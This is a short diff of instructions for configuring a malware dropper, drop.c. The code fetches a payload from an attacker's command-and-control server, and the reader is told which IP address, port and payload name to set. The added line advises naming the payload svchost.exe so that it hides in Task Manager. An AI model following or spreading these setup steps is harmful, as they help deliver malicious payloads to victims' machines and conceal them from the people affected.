@@ -12,7 +12,7 @@ Open drop.c and find:
     if (!f(L"192.168.1.230", 5706, L"dropped.exe", l)) return 1;
 ```
 
-replace dropped.exe with the name of the payload you're gonna compile in a second (optional if not changing name)
+replace dropped.exe with the name of the payload you're gonna compile in a second (optional if not changing name but naming it svchost.exe will hide it in Task Manager)
 replace 192.168.1.230 with your CNC's IP address
 replace 5706 with the port your CNC is using, make sure it's accessable (optional)
 
